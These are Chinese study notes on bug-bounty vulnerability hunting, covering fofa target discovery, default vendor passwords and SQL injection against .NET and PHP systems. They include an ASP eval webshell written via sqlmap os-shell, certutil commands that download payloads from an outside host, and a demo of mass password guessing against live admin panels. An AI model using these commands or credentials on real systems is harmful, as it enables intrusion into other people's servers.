# XD安全 学习笔记 | SRC漏洞挖掘经验

原创 曦 [0x00实验室](javascript:void(0);) *2021-08-28 08:15*

收录于合集

\#学习笔记3个

\#渗透测试9个

\#小迪安全笔记20个

点击上方蓝字关注我们





本文为day86-88天的学习笔记

来源于团队成员：曦



往期推荐





XD安全渗透 学习笔记 | XSS漏洞阶段

XD安全渗透 学习笔记 | CSRF-SSRF阶段

XD安全渗透测试课 学习笔记 |  内网渗透(四)

XD安全渗透测试课 学习笔记 | 内网渗透(三)

XD安全渗透测试课程 学习笔记 |  内网渗透(二)

XD安全渗透测试 学习笔记 |  内网渗透(一)



------

漏洞平台：

补天漏洞响应平台：https://www.butian.net/

漏洞银行：https://www.bugbank.cn/

阿里云漏洞响应平台：https://security.alibaba.com/i

春秋 SRC 部落：https://www.ichunqiu.com/src

腾讯应急响应中心：https://security.tencent.com/index.php

教育行业漏洞报告平台：https://src.sjtu.edu.cn/

网易、百度等等。每个平台都有每个平台的特点



**0x01 教育漏洞平台挖掘：** 

**1.规则**

1.1 法律法规：验证出来漏洞就行，不要去看别人的数据，免得要去吃国家饭

1.2 漏洞说明

1.3 评分奖励：白帽子提交漏洞，可获取一定金币，在礼品中心可以利用金币兑换相关礼品。根据提交的严重程度来判断严重 9~10 高 7~9 中 4~7 低 0~4**2.**

**思路：**

2.1 手工：特点麻烦，效率不高

2.2 常规检测：主要使用工具进行探测，一般使用 Xray AWVS 等一些工具进行扫描，再配合某些平台的默认弱口令密码使用脚本收集带有 edu.cn 的域名，再使用 Xray 批量检测

2.3 定点检测：TP 代码执行 Shiro 反序列化 fastjson 反序列化等 漏洞利用：网上有利用的代码 批量检测的脚本

2.3.1 最新的漏洞单独开发 可以利用漏洞复现的过程去开发自己的脚本

**3.教育网的特点：**

3.1 一般带 edu.cn 结尾的都是教育网的网站

**4.收集信息：**

4.1 通过编写 python 爬虫来收集学校信息

4.2 通过 fofa（https://fofa.so/）搜索带关键词的信息 例如："edu.cn" "edu.cn" && country="CN"

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibVXD3ULCk234YXWEz0P9zDspvox0FMuaT2icvVAou29gynurib2b33aYU7wNZwGbpJEVZjf423HVmg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



4.2.1 搜索带使用 jumpserver 的网站 "edu.cn" && "jumpserver"

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibVXD3ULCk234YXWEz0P9zDp5k5qibP2bKzibiaAtFayxuy3oVMeHCt2YbRVmgmybhUwMt8RFMtibU5nA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



4.2.3 关于漏洞复现 网上可以搜索到别人搭建好的环境 也可自己搭建环境进行测试

jumpserver的复现过程：

http://www.360doc.com/content/21/0117/01/28379861_957370394.shtml



4.3.利用脚本来爬取教育网网站 这步收集的信息可以使用工具批量检测漏洞

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibVXD3ULCk234YXWEz0P9zDxDa5cus75AuvserYeIIm65DXOLH8icLg3k6SJy5bJnCCS8iaPpYUPicaQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



**5.弱口令**

5.1 使用一些品牌的默认弱口令去测试 列举了一些比较大的厂商的默认账号和密码 

例如：juniper 登录地址:https://192.168.1.1 用户名:netscreen 密码:netscreen

Cisco 登录地址:https://192.168.0.1 用户名:admin 密码:cisco

Huawei 登录地址:http://192.168.0.1 用户名:admin 密码:Admin@123

深信服 VPN：51111 端口 delanrecover

华为 VPN：账号：root 密码：mduadmin

华为防火墙：admin Admin@123 eudemon



**6.补充**

6.1 比如说补天等漏洞平台只能用手工的方式来测试，单一目标



**0x02 CNVD 证书平台挖掘技巧**

**1.通用类型漏洞小思路**

1.1 通用系统的分类：开源系统、闭源系统、售卖系统

1.2 目标收集（fofa 举例）：

- 
- 
- 
- 
- 
- 

```
body="技术支持："&& title="登录"title="系统管理"&& body="登录登陆"Country="CN" && bodu="js/login.js" && title = "用户" 等等这类的方法有个弊端，效率不是很高。我们可以在收集目标的时候利用一些JavaScript 库进行目标搜索，这类的 JavaScript 库基本上都用于单点登录系统上，例如：body="jquery/jquery-1.11.1.js" && country="CN" && body!="privacycn.pl" &&title!="login"
```



![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibVXD3ULCk234YXWEz0P9zDm28QM1GpC4uic264kybw4bW2v3tW2P8zXNA5eY9GGp6W0TXSbnR6s4A/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



- 

```
body="jquery.spritely-0.6.js"&& country="CN"
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibVXD3ULCk234YXWEz0P9zDop0GTrZ3IOMDZtGIAzsKIq0Vw5AXsqdwhyeDbaFqicbFxvrhaWFED6Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

还可以通过 批量搜索 JavaScript 库 组合骚语句 让目标搜索更高效



**2 对单点登录系统的未授权漏洞挖掘小思路**

  这里主要是对.net 平台进行思路分享，因为就目前单点登录系统，除了那几家厂商，其他的基本都是.net 或者 java 开发的抛开其他的不谈，java 开发的是真的难日，就一个登录框，就算挖到了也不一定能未授权(不需要登录的情况下)打进去在面对一个登录框的时候，我一般会先操起 Burp 爆破一波账号密码，既然是通用，那么肯定就有那么一两个粗心的管理员把账号密码设置为弱口令，如果能弱口令进去，找几个接口挖未授权漏洞都很容易，在这儿需要注意的是登录的时候抓包的问题就比如这个通用系统，账号密码爆破成功了，账号 admin 密码 admin 第一个为登录包

  

   js 路径爆破 网上收集 js 文件路径 寻找 js 文件中带有 Ajax 的缓存有百分之八九十都是未授权的

例如：url:"../xxxx/xxxx.ashx" 再构造 pst 数据包将错误的paloay（各种报错 payload：https://blog.csdn.net/like98k/article/details/79646512） 打过去就成功了通过注入点写文件-->拿 shell-->到最后一步(拿 shell 找接口反编译 dl 白盒渗透)



**补充：** 

tips:mssql 数据库中文网站路径无法用 echo 写 shell 问题sqlmap 执行--os-shell 后用 echo 写 shell

如下最常用的 echo 写 shellecho ^<^%eval request("z")%^>^> E:\\1 项目资料\E7HRBLL\\Report\\KaoQin\\1.aspcmd 中 sqlmap 将“E:1\项目资料\E7HRBLL\Report\KaoQin\1.asp”这个默认utf8 编码的路径进行 hex 编码然后传参到 gbk 编码的 mssql 数据库中执行。中文路径会直接乱码，导致无法写 shell.

解决办法:

1 使用 certutil.exe 下载certutil -urlcache -split -f http://xss.xiuo9.cn/1.execertutil.exe -urlcache -split -f http://xss.xiu09.cn/1.txt D:\1.asp

2 使用 sqlmap 自带上传功能（也是利用 certutil.exe，但是兼容性更好，推荐使用)首先在本机写一个 gbk 编码的 txt，内容是 echo 写木马



然后 sQLmap 执行-file-write C\Usersxiu\Desktop\1.txt -file-dest D:\1.bat将本地 1.txt 上传到对方机器 d 盘 1.bat然后在 os-shell 中执行 1.bat 可以自动将 shell 写到自己想写的路径也可以用于写上线马



**3 通过其他端口拿到源码后的简单利用** 

通过 js/爆破等方法都无法进—步利用，可以 fofa 搜这个通用的系统的其他端口,



**4 拿到源码之后要怎么做**

4.1 拿到源码之后，第一时间寻找 web.config（详见https://www.cnblogs.com/kevin860/p/10958299.html），看配置文件，有写有数据库的东西跟一下接口

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibVXD3ULCk234YXWEz0P9zDiaDOTEGicsTZwWue3JDiawbzFW3T1CWALKH0WlWrXCykBGFsJycXSW2Cg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



接下来就寻找 asmx 结尾的文件

asmx 是什么？asmx 是 WEB 服务文件asmx.cs 里有相关代码属于 B/S 形式，用 SOAP 方式 HTTP 访问，用 XML 返回可以返回基础类型和 PUBLIC 结构类型。

在 C/S 结构中经常用到

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibVXD3ULCk234YXWEz0P9zDXic6LPfakEtZhLVStUjBobWcaHYxR5NC8YyPfnVibuFGcSm8CJwny7Mg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibVXD3ULCk234YXWEz0P9zDicAjbD9QtibyE4A4liaeI2GTPH3cxX6uzgSZyCCytibksFHcLzr4uXvc7Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

soap 最容易出现什么漏洞

注入 上传 各种信息泄露等等

最简单的办法，发现 soap 直接丢到 sqlmap 百分之八十出注入



4.2 寻找 ashx 结尾的文件ashx 是 sapx 的众多组件之一，也是.net 的扩展名之一我们也可以把 ashx 理解成各种方法通过 Class 类找到对应的 dll 文件，拖到 dnspy 反编译比如说 upload.ashx找到对应的 dll 文件拖到 dnspy 反编译使用 action 来调用方法并且 upload.ashx 有多达 30 多个方法，然而程序员将只调用了几个有拦截的文件上传接口，这些没拦截的任意文件上传和任意文件删除方法不通过反编译是挖掘不了的任意文件删除方法http://xxxxxx0xxx/Ajax/upload.ashx?action=deleteBackground&nameD:/FumaBS_New/1.txt



思路：

1.爆破 js 寻找有没有 asmx 的文件

2.目录遍历 寻找 saop 接口 一般有目录遍历有百分之八十是能找到 soap 接口补充：利用反编译寻找其他的方法，.net 可以扫备份文件

**
**

**0x03 SRC 挖掘-拿下 CNVD 证书** 

3.1条件：通用性 100+ip 部署该系统 公司注册资产超 5000w分类 ：开源 闭源 售卖开源：代码审计 自动扫描闭源：尝试性获取源码 无源码下 js 接口测试 常规类黑盒安全测试售卖：尝试性获取源码 无源码下 js 接口测试 常规类黑盒安全测试技术：代码审计 影响查找代码审计：PHP .net Java影响查找：黑暗引擎 白白引擎

3.2 如何寻找上述三类系统并进行安全测试开源：各大源码站进行下载代码审计闭源：fofa 搜索尝试获取源码审计或黑盒测试售卖：套路社工获取源码或购买源码审计或黑盒测试确定无源码的情况下，课利用 js 文件（详见https://blog.csdn.net/weixin_40418457/article/details/116451794）寻找测试接口

3.2 如果挑选最简单的入手目前 Java 的开发难度最大，py 的项目较少，挑 php，aspx 入手其中 PHP 代码清晰明了，前面也讲了，aspx 涉及反编译代码后审计body="DM-static/assets/jquery.js,""admindm-yourname"

app="网校登录系统”-jsfinderhttps://123.57.65.252/student/#/Login



补充：

技术点 1：各种语言代码审计，无源码除常规安全测试外 js 下的测试口等



**0x04 演示** 

5.1 开源下载源码（http://down.chinaz.com/soft/37361.htm）关键词（../admindm-yourname/g.php or /login.php）fofa 搜索影响范围 大于100+ 可以有证书。

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibVXD3ULCk234YXWEz0P9zDyV2P67pPzib88ic3MXMnP0VMZcnnibx3MLrIc0ib9M93rtolVAqIooH1nw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



- 

```
"login.php" && "CN" && country="CN"
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibVXD3ULCk234YXWEz0P9zD2PY6xoF0sVa7Kc18EvSnHoC9PibKD0mHbCl89dOlA891ibSxHX9BBecw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



搭建网站（https://www.xp.cn/download.html）

先安装再挖，不然就会问题首先把文件下载完成 打开安装（这边用的是 2018 版本的）安装数据库文件 其他选项菜单 》 MySQL 工具 》 MySQL 命令行 默认密码是root创建数据库 create database cnvddm;选择数据库 mysql -uroot -p root

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibVXD3ULCk234YXWEz0P9zDTcfLfTQj9ibWUb46AcVHiasbpPYSaRdRtxXQgTicHHOJEoVEz5edniaUTg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



使用数据库 use cnvddm;

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibVXD3ULCk234YXWEz0P9zDESbTy6Diaxh1ibpNPab46YmmZ1dbmGrECzNrJWIKGibmiaICJR88cZxdhA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



导入数据库 sourece D:\\phpstudy_pro\\WWW\\cnvd88\\import.sql

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibVXD3ULCk234YXWEz0P9zDaROAK58ofstI4cHbq1aPFFQGCmCfyibKvmqKQSJJbicTxuESKwIEfn4w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



查看导入数据 show table;

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibVXD3ULCk234YXWEz0P9zD3GwEsQgnvW04yx1BvHicjM3MFrv70g4L1iadDwx26MbnBgKjocYXkk8Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



将配置配置完成即可安装成功

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibVXD3ULCk234YXWEz0P9zDvwdfp2VE2JQRddUArmQibCr1kMahhFMRZl0kXicP5GYcpMkVLiavGiaGgg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



但是安装的过程中没有涉及到账号密码的创建

默认的账号密码还是 admin admin123

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibVXD3ULCk234YXWEz0P9zDENPbGxTOkulv9gnLln8Jm7mEZ3JquKicfTdxiaMo31HZPyeZbveniaFEQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



使用脚本爬取 fofa 的批量目标

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibVXD3ULCk234YXWEz0P9zDOF4SJTPKbp1ePMY9otSKiaHGLoqp3LU71ujYXUphhJo0GY7ajuklYAA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



爬取到的地址 再使用脚本进行密码猜解

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibVXD3ULCk234YXWEz0P9zDaPmqr6wxiceyXcYNZknTJErSXpaWicThgbXLNf4TibQg6NCnlXC6e1slQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



通过脚本批量检测后台账号密码

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibVXD3ULCk234YXWEz0P9zDLmqNYX0GHr4lBfSjYy2rSa4WQX4NbzVq4bn6tAq0P5ibx9NTvnhYa8Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



爬取到账号密码 admin admin123 的后台地址

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibVXD3ULCk234YXWEz0P9zDy7zXxiarYGyb58WCDZicZuYTzDsVQHX5UqhAEX1VORT5icVLTgyOe30XA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



可以通过 js 文件在 fofa 寻找模板 满足通用 100+的条件

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibVXD3ULCk234YXWEz0P9zDHuAibHwYnqztseCor03loUjK0picW5U24bCAgxgX2iaFPqueCX1zpjucQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



也看看利用 js 文件搜索 加上网站的后台链接/admindmyourname/mod_common/login.php 也可以访问

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibVXD3ULCk234YXWEz0P9zDIZQ1zOlVGq17C7oDfXf5yNsuzXCyRT60xMOY8VD7IqPwcSySTqwMYg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibVXD3ULCk234YXWEz0P9zDUbrnPquXBwngYqantGDzPu0PxUjicyHXYLeGzicSShTWg7XLph8VpUCw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



- 
- 

```
接下来可以用代码审计审计  地址https://github.com/f1tz/cnseay
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibVXD3ULCk234YXWEz0P9zD2aBamw1CWwiayxgdLibibqu5tIsO5M7ADauYBw9tQAR9NFOXZyxPYyh6w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



ip通过该get ip来的

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibVXD3ULCk234YXWEz0P9zDJGVrOdH50wx0KBoRqn82wuNTmw4zAhgloB8xBPDFwMztlNjqlDNNQQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



函数定位看见有过滤关键词的这些过滤的是xss的不是过滤注入的漏洞XFF注入

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibVXD3ULCk234YXWEz0P9zDQEv7U8codjEibVicfARq7VQfavIaY0kRT1bIpk5YNWllvGFE6mjkUXzg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

存在SQL注入



![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibVXD3ULCk234YXWEz0P9zDnjWUDd47F4g9z3eftpNzcUSkYhJKhhljiaKrbicId6kxxKibjOwwNN6JA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



5.2 Java或者.net 网站dll文件反编译

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibVXD3ULCk234YXWEz0P9zDemiafGxSSgu9UVrWXAJERXM2JOVBsm7NZ1FbFcY3RiaEL8DSJtXecmvg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibVXD3ULCk234YXWEz0P9zDzdq3DgUMsrDoqSToZ9fwaicAl6PMQ4QXqzjBERuKsyuBEFO8AcvRVPA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



JavaScript文件fofa搜索app="网校登录系统" 这类不是开源的系统

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibVXD3ULCk234YXWEz0P9zDYBQIntTVrA3qgyZml6aUUibNJGHy9SQiaVaLTyFvlYxEJ7KmVz33pCFw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



搜索目录下的js文件链接https://github.com/Threezh1/JSFinder用法（没有bs4自行安装）python3 JSFinder.py -u http://60.30.156.170/student/#/Login

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibVXD3ULCk234YXWEz0P9zDWibIQ8sIw8D5P9TMALZLKo1CeJ9Y4HUlSfrvaj557MLEXSUbHV54onQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



查询到框架就可以通过tp漏洞测试安全性

![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibVXD3ULCk234YXWEz0P9zDDk4LFOwzueoDiaOWMcI8XTCUEZk0ZIXibWCIiaZIdUhFwHlzqdJqGS7bQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



![图片](https://mmbiz.qpic.cn/mmbiz_png/cbYIBjX6JJibVXD3ULCk234YXWEz0P9zD3MPLYhibC6oH4OG1hGRGIuicpsXjw1D0PgFXwHkPFL8DubnAIUxy1I6g/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)